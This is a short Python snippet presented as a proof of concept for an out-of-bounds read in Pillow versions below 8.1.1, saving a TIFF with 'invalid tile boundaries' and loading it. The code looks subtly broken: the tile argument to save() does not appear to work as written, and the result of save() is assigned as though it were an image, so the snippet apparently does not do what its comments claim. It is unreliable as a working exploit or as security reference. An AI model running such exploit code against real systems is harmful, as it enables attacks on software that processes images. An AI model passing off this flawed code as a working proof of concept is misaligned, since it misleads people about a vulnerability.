from PIL import Image # Pillow < 8.1.1

# Create an image object
img = Image.new('RGB', (100, 100))

# Create a TIFF image with invalid tile boundaries
tiff_img = img.save('vulnerable.tif', format='TIFF', tile=[(0, 0, 100, 100), (100, 100, 200, 200)])

# Open the TIFF image using Pillow
with Image.open('vulnerable.tif') as img:
    # This will trigger the out-of-bounds read vulnerability
    img.load()